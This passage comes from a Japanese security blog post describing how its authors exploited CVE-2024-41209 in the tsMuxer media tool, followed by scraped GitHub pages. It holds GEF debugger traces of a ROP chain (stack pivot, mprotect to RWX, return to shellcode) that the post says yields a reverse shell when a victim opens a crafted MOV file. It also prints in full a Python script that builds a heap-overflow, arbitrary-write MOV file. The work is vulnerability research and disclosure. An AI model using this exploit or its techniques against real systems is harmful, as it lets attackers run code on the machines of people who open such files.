$r14   : 0x00000000008fe018 <_GLOBAL_OFFSET_TABLE_+0x18>  ->  0x0000000000760dc0 <__strcasecmp_avx>  ->  0x90c0c748fa1e0ff3
$r15   : 0x00007fffffffdc90  ->  0x00000000ffffde00
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ stack ----
$rsp  0x7fffffffcff0|+0x0000|+000: 0x00007fffffffd020  ->  0x00007fffffffd050  ->  0x00007fffffffd070  ->  ...
      0x7fffffffcff8|+0x0008|+001: 0x0000000000939e30  ->  0x00000000008f6528 <vtable for MovDemuxer+0x10>  ->  0x00000000004be4d8 <MovDemuxer::~MovDemuxer()>  ->  ...  <-  $rax, $rdi
      0x7fffffffd000|+0x0010|+002: 0x00007fffffffd020  ->  0x00007fffffffd050  ->  0x00007fffffffd070  ->  ...
      0x7fffffffd008|+0x0018|+003: 0x9ec84812c6782000  <-  canary
      0x7fffffffd010|+0x0020|+004: 0x00007fffffffd040  ->  0x00007fffffffd070  ->  0x00007fffffffd0b0  ->  ...
      0x7fffffffd018|+0x0028|+005: 0x00000000004534f8 <IOContextDemuxer::get_be16()+0x2e>  ->  0x5d5b18c48348d809
      0x7fffffffd020|+0x0030|+006: 0x00007fffffffd050  ->  0x00007fffffffd070  ->  0x00007fffffffd0b0  ->  ...
      0x7fffffffd028|+0x0038|+007: 0x0000000000939e30  ->  0x00000000008f6528 <vtable for MovDemuxer+0x10>  ->  0x00000000004be4d8 <MovDemuxer::~MovDemuxer()>  ->  ...  <-  $rax, $rdi
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ code:x86:64 ----
*-> 0x7b0851 89ec                <fread_unlocked+0x51>   mov    esp, ebp
    0x7b0853 5b                  <fread_unlocked+0x53>   pop    rbx
    0x7b0854 5d                  <fread_unlocked+0x54>   pop    rbp
    0x7b0855 4c89e0              <fread_unlocked+0x55>   mov    rax, r12
    0x7b0858 415c                <fread_unlocked+0x58>   pop    r12
    0x7b085a c3                  <fread_unlocked+0x5a>   ret

```

その後、mprotectをsyscall命令で実行する際の引数を用意します。

* `pop rdi; ret;` でシェルコードを格納する予定の0x901000をrdiレジスタにセットします。

rspレジスタの指す領域が、stack pivotによって\_IO\_file\_jumps上にあることも確認できます。

* `pop rsi; ret;` で `0x4000` をrsiレジスタにセットします。
* `pop rdx; ret;` でrwxを表す `7` をrdxレジスタにセットします。
* `pop rax; ret;` でmprotectを指定する `0xa` をraxレジスタにセットします。

mprotectを実行する直前の状態を確認します。

```
$rax   : 0x000000000000000a
$rbx   : 0x00000000dead0000
$rcx   : 0x0000000000000001
$rdx   : 0x0000000000000007
$rsp   : 0x0000000000901ec0 <_IO_file_jumps+0x60>  ->  0x00000000007b0851 <fread_unlocked+0x51>  ->  0x41e0894c5d5bec89
$rbp   : 0x00000000cafe0000
$rsi   : 0x0000000000004000
$rdi   : 0x0000000000901000 <main_arena+0x760>  ->  0x0000000000900ff0 <main_arena+0x750>  ->  0x0000000000900fe0 <main_arena+0x740>  ->  0x0000000000900fd0 <main_arena+0x730>  ->  ...
$rip   : 0x0000000000627791 <__deallocate_stack+0xe1>  ->  0x48001f0fc35d050f
$r8    : 0x0000000000918580 <std::cout>  ->  0x00000000008fb9a0 <vtable for std::ostream+0x18>  ->  0x00000000006afb40 <std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()>  ->  0x88c0c748fa1e0ff3
$r9    : 0x00007fffffffd950  ->  0x00007fffffffdb38  ->  0x000000000093aec0  ->  0x474e5543432b2b00
$r10   : 0x000000000091a3b0 <dwarf_reg_size_table>  ->  0x0808080808080808
$r11   : 0x0000000000000000
$r12   : 0x00000000dead0012
$r13   : 0x00000000007e2a98  ->  0x00203a726f727245 ('Error: '?)
$r14   : 0x00000000008fe018 <_GLOBAL_OFFSET_TABLE_+0x18>  ->  0x0000000000760dc0 <__strcasecmp_avx>  ->  0x90c0c748fa1e0ff3
$r15   : 0x00007fffffffdc90  ->  0x00000000ffffde00
$eflags: 0x206 [ident align vx86 resume nested overflow direction INTERRUPT trap sign zero adjust PARITY carry] [Ring=3]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ stack ----
$rsp  0x000000901ec0|+0x0000|+000: 0x00000000007b0851 <fread_unlocked+0x51>  ->  0x41e0894c5d5bec89
      0x000000901ec8|+0x0008|+001: 0x0000000000901e40 <_IO_file_jumps_mmap+0xa0>  ->  0x0000000000735d00 <_IO_default_imbue>  ->  0x2e6666c3fa1e0ff3  <-  retaddr[1]
      0x000000901ed0|+0x0010|+002: 0x0000000000731c70 <_IO_file_read>  ->  0x70478b44fa1e0ff3  <-  retaddr[2]
      0x000000901ed8|+0x0018|+003: 0x0000000000731570 <_IO_new_file_write>  ->  0x89495541fa1e0ff3
      0x000000901ee0|+0x0020|+004: 0x0000000000730d10 <_IO_file_seek>  ->  0xe9707f8bfa1e0ff3
      0x000000901ee8|+0x0028|+005: 0x00000000007308f0 <_IO_file_close>  ->  0xe9707f8bfa1e0ff3
      0x000000901ef0|+0x0030|+006: 0x0000000000731550 <_IO_file_stat>  ->  0x8bf28948fa1e0ff3  <-  retaddr[3]
      0x000000901ef8|+0x0038|+007: 0x0000000000735cf0 <_IO_default_showmanyc>  ->  0xffffffb8fa1e0ff3  <-  retaddr[4]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ code:x86:64 ----
    0x627780 be81000000          <__deallocate_stack+0xd0>   mov    esi, 0x81
    0x627785 b8ca000000          <__deallocate_stack+0xd5>   mov    eax, 0xca
    0x62778a 488d3d37fe2e00      <__deallocate_stack+0xda>   lea    rdi, [rip + 0x2efe37] # 0x9175c8 <stack_cache_lock>
 -> 0x627791 0f05                <__deallocate_stack+0xe1>   syscall
    0x627793 5d                  <__deallocate_stack+0xe3>   pop    rbp
    0x627794 c3                  <__deallocate_stack+0xe4>   ret
    0x627795 0f1f00              <__deallocate_stack+0xe5>   nop    DWORD PTR [rax]
    0x627798 488d3d29fe2e00      <__deallocate_stack+0xe8>   lea    rdi, [rip + 0x2efe29] # 0x9175c8 <stack_cache_lock>
    0x62779f e81cb70000          <__deallocate_stack+0xef>   call   0x632ec0 <__lll_lock_wait_private>
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- arguments ----
[+] Detected syscall (arch:X86, mode:64)
    mprotect(unsigned long start, size_t len, unsigned long prot)
[+] Parameter            Register             Value
    RET                  $rax                 -
    _NR                  $rax                 0xa
    start                $rdi                 0x0000000000901000 <main_arena+0x760>  ->  0x0000000000900ff0 <main_arena+0x750>  ->  0x0000000000900fe0 <main_arena+0x740>  ->  0x0000000000900fd0 <main_arena+0x730>  ->  ...
    len                  $rsi                 0x0000000000004000
    prot                 $rdx                 0x0000000000000007

gef> vmmap -n
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 0x0000000000000000 r-- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR
0x0000000000401000 0x00000000007d9000 0x00000000003d8000 0x0000000000001000 r-x /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $rip
0x00000000007d9000 0x00000000008ea000 0x0000000000111000 0x00000000003d9000 r-- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $r13
0x00000000008ea000 0x00000000008fe000 0x0000000000014000 0x00000000004e9000 r-- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR
0x00000000008fe000 0x0000000000903000 0x0000000000005000 0x00000000004fd000 rw- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $rsp, $rdi, $r14
0x0000000000903000 0x0000000000940000 0x000000000003d000 0x0000000000000000 rw- [heap]<tls-th1>  <-  $r8, $r10
0x00007ffff73c2000 0x00007ffff77f8000 0x0000000000436000 0x0000000000000000 rw-
0x00007ffff77f8000 0x00007ffff77f9000 0x0000000000001000 0x0000000000000000 ---
0x00007ffff77f9000 0x00007ffff7ff9000 0x0000000000800000 0x0000000000000000 rw- <tls-th2><stack-th2>
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]

```

syscallを呼んだ後は、続く`pop rbp; ret;` でstack pivotに使ったガジェットにretしないようにstackをずらします。

mprotectを実行した結果、メモリ領域はrwxになっています。

```
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ stack ----
$rsp  0x000000901ec0|+0x0000|+000: 0x00000000007b0851 <fread_unlocked+0x51>  ->  0x41e0894c5d5bec89
      0x000000901ec8|+0x0008|+001: 0x0000000000901e40 <_IO_file_jumps_mmap+0xa0>  ->  0x0000000000735d00 <_IO_default_imbue>  ->  0x2e6666c3fa1e0ff3  <-  retaddr[1]
      0x000000901ed0|+0x0010|+002: 0x0000000000731c70 <_IO_file_read>  ->  0x70478b44fa1e0ff3  <-  retaddr[2]
      0x000000901ed8|+0x0018|+003: 0x0000000000731570 <_IO_new_file_write>  ->  0x89495541fa1e0ff3
      0x000000901ee0|+0x0020|+004: 0x0000000000730d10 <_IO_file_seek>  ->  0xe9707f8bfa1e0ff3
      0x000000901ee8|+0x0028|+005: 0x00000000007308f0 <_IO_file_close>  ->  0xe9707f8bfa1e0ff3
      0x000000901ef0|+0x0030|+006: 0x0000000000731550 <_IO_file_stat>  ->  0x8bf28948fa1e0ff3  <-  retaddr[3]
      0x000000901ef8|+0x0038|+007: 0x0000000000735cf0 <_IO_default_showmanyc>  ->  0xffffffb8fa1e0ff3  <-  retaddr[4]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ code:x86:64 ----
    0x627785 b8ca000000          <__deallocate_stack+0xd5>   mov    eax, 0xca
    0x62778a 488d3d37fe2e00      <__deallocate_stack+0xda>   lea    rdi, [rip + 0x2efe37] # 0x9175c8 <stack_cache_lock>
    0x627791 0f05                <__deallocate_stack+0xe1>   syscall
 -> 0x627793 5d                  <__deallocate_stack+0xe3>   pop    rbp
    0x627794 c3                  <__deallocate_stack+0xe4>   ret
    0x627795 0f1f00              <__deallocate_stack+0xe5>   nop    DWORD PTR [rax]
    0x627798 488d3d29fe2e00      <__deallocate_stack+0xe8>   lea    rdi, [rip + 0x2efe29] # 0x9175c8 <stack_cache_lock>
    0x62779f e81cb70000          <__deallocate_stack+0xef>   call   0x632ec0 <__lll_lock_wait_private>
    0x6277a4 e924ffffff          <__deallocate_stack+0xf4>   jmp    0x6276cd <__deallocate_stack+0x1d>

gef> vmmap -n
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 0x0000000000000000 r-- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR
0x0000000000401000 0x00000000007d9000 0x00000000003d8000 0x0000000000001000 r-x /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $rcx, $rip
0x00000000007d9000 0x00000000008ea000 0x0000000000111000 0x00000000003d9000 r-- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $r13
0x00000000008ea000 0x00000000008fe000 0x0000000000014000 0x00000000004e9000 r-- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR
0x00000000008fe000 0x0000000000901000 0x0000000000003000 0x00000000004fd000 rw- /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $r14
0x0000000000901000 0x0000000000903000 0x0000000000002000 0x0000000000500000 rwx /home/vagrant/blog_tsmuxer/tsMuxer/bin/lnx/tsMuxeR  <-  $rsp, $rdi
0x0000000000903000 0x0000000000905000 0x0000000000002000 0x0000000000000000 rwx
0x0000000000905000 0x0000000000940000 0x000000000003b000 0x0000000000000000 rw- [heap]<tls-th1>  <-  $r8, $r10
0x00007ffff73c2000 0x00007ffff77f8000 0x0000000000436000 0x0000000000000000 rw-
0x00007ffff77f8000 0x00007ffff77f9000 0x0000000000001000 0x0000000000000000 ---
0x00007ffff77f9000 0x00007ffff7ff9000 0x0000000000800000 0x0000000000000000 rw- <tls-th2><stack-th2>
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]

```

後は、シェルコードを配置したメモリ領域にretするだけです。

1番目のステップで作成したシェルコードが実行され、execveによってリバースシェルが起動します。

最終的なエクスプロイトコードを以下に示します。

<https://github.com/RICSecLab/exploit-poc-public/blob/main/CVE-2024-41209/exploit_final_poc.py>

以下の画像は、 `/bin/sh/ -c "id; date"` をexecveシステムコールに渡して実行した結果です。文字列としてリバースシェルを起動するコマンド列を用意すれば、victimがクラフトされたMOVファイルを開いた際に、別のデバイスからvictimのシェルに接続できてしまいます。

|  |
| --- |
| 任意コード実行の様子 |

### まとめ

Fuzzerが発見したクラッシュを解析し、Exploitコードを開発するまでのプロセスを解説しました。

脆弱性の根本原因を特定し、最小のPoCを作成し、コード実行を実現するためのパズルを組み立てる思考の流れは、CTFのそれとも近く、とても楽しいものです。

本脆弱性の発見・報告と本記事の執筆に携わったArataとiwashiiraは、リチェルカセキュリティでパートタイマーとして働いています。当社には他にもバイナリ解析の領域で若い才能にお任せしたい業務がたくさんあります。この記事を読んで当社の取り組みにご興味を持った方は、ぜひ[カジュアル面談](https://forms.gle/Wyc3APvLg429etQB9)にお申し込みください。

at

[October 25, 2024](https://ricercasecurity.blogspot.com/2024/10/rezzuf0-day-cve-2024-41209.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=3515303827331053196&postID=4643157203198067756&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=3515303827331053196&postID=4643157203198067756&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=3515303827331053196&postID=4643157203198067756&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=3515303827331053196&postID=4643157203198067756&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=3515303827331053196&postID=4643157203198067756&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=3515303827331053196&postID=4643157203198067756&target=pinterest "Share to Pinterest")

#### No comments:

#### Post a Comment

[Newer Post](https://ricercasecurity.blogspot.com/2024/11/def-con-32-ctf-finals.html "Newer Post")

[Older Post](https://ricercasecurity.blogspot.com/2024/07/dicectf-2024-finals.html "Older Post")

[Home](https://ricercasecurity.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://ricercasecurity.blogspot.com/feeds/4643157203198067756/comments/default)

## Search This Blog

|  |  |
| --- | --- |

* [ホーム](https://ricercasecurity.blogspot.com/)

|  |  |
| --- | --- |

## Blog Archive

* [December 2024](https://ricercasecurity.blogspot.com/2024/12/) (1)
* [November 2024](https://ricercasecurity.blogspot.com/2024/11/) (2)
* [October 2024](https://ricercasecurity.blogspot.com/2024/10/) (1)
* [July 2024](https://ricercasecurity.blogspot.com/2024/07/) (1)
* [October 2023](https://ricercasecurity.blogspot.com/2023/10/) (1)
* [September 2023](https://ricercasecurity.blogspot.com/2023/09/) (1)
* [July 2023](https://ricercasecurity.blogspot.com/2023/07/) (5)
* [June 2023](https://ricercasecurity.blogspot.com/2023/06/) (6)
* [December 2022](https://ricercasecurity.blogspot.com/2022/12/) (1)
* [October 2022](https://ricercasecurity.blogspot.com/2022/10/) (1)
* [September 2022](https://ricercasecurity.blogspot.com/2022/09/) (1)
* [July 2022](https://ricercasecurity.blogspot.com/2022/07/) (1)
* [June 2022](https://ricercasecurity.blogspot.com/2022/06/) (1)
* [December 2021](https://ricercasecurity.blogspot.com/2021/12/) (2)
* [November 2021](https://ricercasecurity.blogspot.com/2021/11/) (2)
* [April 2020](https://ricercasecurity.blogspot.com/2020/04/) (1)

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from github.com_91a95d91_20250115_114649.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_aaw.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_aaw.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RICSecLab%2Fexploit-poc-public)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RICSecLab](/RICSecLab)
/
**[exploit-poc-public](/RICSecLab/exploit-poc-public)**
Public

* [Notifications](/login?return_to=%2FRICSecLab%2Fexploit-poc-public) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)
* [Star
   20](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)

* [Code](/RICSecLab/exploit-poc-public)
* [Issues
  0](/RICSecLab/exploit-poc-public/issues)
* [Pull requests
  0](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects
  0](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

Additional navigation options

* [Code](/RICSecLab/exploit-poc-public)
* [Issues](/RICSecLab/exploit-poc-public/issues)
* [Pull requests](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

## Files

 main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_aaw.py

Copy path Blame  Blame
## Latest commit

## History

[History](/RICSecLab/exploit-poc-public/commits/main/CVE-2024-41209/exploit_aaw.py)86 lines (73 loc) · 2.67 KB main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_aaw.py

Top
## File metadata and controls

* Code
* Blame

86 lines (73 loc) · 2.67 KB[Raw](https://github.com/RICSecLab/exploit-poc-public/raw/refs/heads/main/CVE-2024-41209/exploit_aaw.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env python3from ptrlib import \*
# ファイルヘッダftyp = b''ftyp += b'iso5' # major\_brandftyp += p32(1, 'big') # minor\_version
# tfhdのためにnum\_tracksをインクリメントするtrak = b''
# tfhdのためにtrexを追加するtrex1 = b''trex1 += b'\x00' # versiontrex1 += b'\x00\x00\x00' # flagstrex1 += p32(1, 'big') # track\_idtrex1 += p32(1, 'big') # stsd\_idtrex1 += p32(0, 'big') # durationtrex1 += p32(0, 'big') # sizetrex1 += p32(0, 'big') # flags
# trunのためにfrag->track\_idを設定するtfhd1 = b''tfhd1 += b'\x00' # versiontfhd1 += b'\x00\x00\x00' # flagstfhd1 += p32(1, 'big') # track\_id
trun1\_entries = [0] \* (0x1f0 // 0x10)trun1 = b''trun1 += b'\x00' # versiontrun1 += b'\x00\x08\x00' # flags (set for ctts\_data)trun1 += p32(len(trun1\_entries), 'big') # entriestrun1 += flat(trun1\_entries, map=lambda x: p32(x, 'big'))
ctts1 = b''ctts1 += b'\x00' # versionctts1 += b'\x00\x00\x00' # flagsctts1 += p32(0, 'big') # entries (resize)
# 本質パートtrun2\_entries = [0xdeadbeef, 0x191] + [u64(b"trun2")] \* 22trun2\_entries += [0x91c800] # 書き込み先trun2 = b''trun2 += b'\x00' # versiontrun2 += b'\x00\x08\x00' # flags (set for ctts\_data)trun2 += p32(len(trun2\_entries), 'big') # entriestrun2 += flat(trun2\_entries, map=lambda x: p32(x, 'big'))
# vectorを作るためのcttsctts2 = b''ctts2 += b'\x00' # versionctts2 += b'\x00\x00\x00' # flagsctts2 += p32(1, 'big') # entries (resize)ctts2 += p32(0, 'big') + p32(0, 'big') # count / duration
# 壊れたvectorに書き込むためのAAWctts3\_entries = [ [0xdeadbeef, 0xcafebabe], [0xdeadbeef, 0xcafebabe]]ctts3 = b''ctts3 += b'\x00' # versionctts3 += b'\x00\x00\x00' # flagsctts3 += p32(len(ctts3\_entries), 'big') # entries (resize)ctts3 += flat(ctts3\_entries, map=lambda p: p32(p[0], 'big') + p32(p[1], 'big'))
moov = b''moov += p32(8 + len(trak), 'big') + b'trak' + trakmoov += p32(8 + len(trex1), 'big') + b'trex' + trex1moov += p32(8 + len(tfhd1), 'big') + b'tfhd' + tfhd1moov += p32(8 + len(trun1), 'big') + b'trun' + trun1moov += p32(8 + len(ctts1), 'big') + b'ctts' + ctts1moov += p32(8 + len(trak), 'big') + b'trak' + trak # MovStreamContextを確保moov += p32(8 + len(ctts2), 'big') + b'ctts' + ctts2 # vectorをセットmoov += p32(8 + len(trun2), 'big') + b'trun' + trun2 # heap overflowmoov += p32(8 + len(ctts3), 'big') + b'ctts' + ctts3 # AAW
payload = b""payload += p32(8 + len(ftyp), 'big') + b'ftyp' + ftyppayload += p32(8 + len(moov), 'big') + b"moov" + moov
with open("exploit.mov", "wb") as f: f.write(payload)
#sock = Process(["./tsMuxeR", "exploit.mov"])#sock.sh()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_9b591c41_20250115_114653.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_final_poc.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_final_poc.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RICSecLab%2Fexploit-poc-public)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RICSecLab](/RICSecLab)
/
**[exploit-poc-public](/RICSecLab/exploit-poc-public)**
Public

* [Notifications](/login?return_to=%2FRICSecLab%2Fexploit-poc-public) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)
* [Star
   20](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)

* [Code](/RICSecLab/exploit-poc-public)
* [Issues
  0](/RICSecLab/exploit-poc-public/issues)
* [Pull requests
  0](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects
